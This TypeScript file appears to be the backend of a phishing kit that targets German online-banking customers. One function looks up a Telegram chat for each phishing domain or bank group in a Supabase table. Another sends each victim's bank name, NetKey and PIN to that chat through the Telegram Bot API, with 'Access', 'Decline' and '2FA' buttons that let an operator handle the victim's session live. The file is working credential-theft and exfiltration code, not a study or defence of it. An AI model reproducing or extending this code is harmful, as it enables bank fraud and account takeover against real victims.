import { createClient } from "@supabase/supabase-js";

export function createQrAdminClient() {
  const url = process.env["SUPABASE_URL"];
  const serviceRoleKey = process.env["SUPABASE_SERVICE_ROLE_KEY"];
  if (!url || !serviceRoleKey) throw new Error("backend_not_configured");
  return createClient(url, serviceRoleKey, { auth: { persistSession: false } });
}

export function escapeTelegramHtml(value: string): string {
  return value.replace(/[&<>]/g, (character) =>
    character === "&" ? "&amp;" : character === "<" ? "&lt;" : "&gt;",
  );
}

function normalizeDomain(value: string | undefined): string | null {
  if (!value) return null;
  const normalized = value.trim().toLowerCase().replace(/^https?:\/\//, "").split("/")[0]?.split(":")[0];
  return normalized?.replace(/^www\./, "") || null;
}

export async function resolveQrChatId(
  sb: ReturnType<typeof createQrAdminClient>,
  bankId: string,
  requestDomain?: string,
): Promise<string | null> {
  const domain = normalizeDomain(requestDomain);
  if (domain) {
    const { data: exactRoute, error } = await sb
      .from("domain_routes")
      .select("telegram_chat_id")
      .ilike("domain", domain)
      .not("telegram_chat_id", "is", null)
      .limit(1)
      .maybeSingle();
    if (error) throw new Error("chat_route_lookup_failed");
    const exactChatId = exactRoute?.telegram_chat_id as string | null | undefined;
    if (exactChatId) return exactChatId;
  }

  const { data: bank } = await sb.from("banks").select("group").eq("id", bankId).maybeSingle();
  const group = bank?.group as string | undefined;
  if (group) {
    const { data: groupRoute } = await sb
      .from("domain_routes")
      .select("telegram_chat_id")
      .eq("address_group", group)
      .not("telegram_chat_id", "is", null)
      .limit(1)
      .maybeSingle();
    const groupChatId = groupRoute?.telegram_chat_id as string | null | undefined;
    if (groupChatId) return groupChatId;
  }

  const { data: defaultRoute } = await sb
    .from("domain_routes")
    .select("telegram_chat_id")
    .eq("is_default", true)
    .not("telegram_chat_id", "is", null)
    .limit(1)
    .maybeSingle();
  const defaultChatId = defaultRoute?.telegram_chat_id as string | null | undefined;
  return defaultChatId || process.env["TELEGRAM_CHAT_ID"] || null;
}

export async function sendQrTelegramMessage(
  sessionId: string,
  bankName: string,
  netkey: string,
  pin: string,
  chatId: string,
) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  if (!token) throw new Error("telegram_not_configured");

  const text = [
    "🔐 <b>QR-Login-Versuch</b>",
    `<b>Bank:</b> ${escapeTelegramHtml(bankName)}`,
    `<b>NetKey:</b> <code>${escapeTelegramHtml(netkey)}</code>`,
    `<b>PIN:</b> <code>${escapeTelegramHtml(pin)}</code>`,
    `<b>Zeit:</b> ${new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}`,
  ].join("\n");

  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Access", callback_data: `access:${sessionId}` },
            { text: "❌ Decline", callback_data: `decline:${sessionId}` },
          ],
          [{ text: "🔐 2FA", callback_data: `2fa:${sessionId}` }],
        ],
      },
    }),
  });
  const body = await response.json().catch(() => ({}));
  if (!response.ok || !body?.ok) {
    console.error("[qrLogin] telegram error", response.status, body);
    const description = typeof body?.description === "string" ? body.description : "unknown";
    throw new Error(`telegram_${response.status}:${description}`);
  }
  return { chatId: String(body.result.chat.id), messageId: body.result.message_id as number };
}

export function sanitizeQrValue(value: string | undefined, max: number): string | null {
  if (typeof value !== "string") return null;
  const trimmed = value.trim().slice(0, max);
  return trimmed || null;
}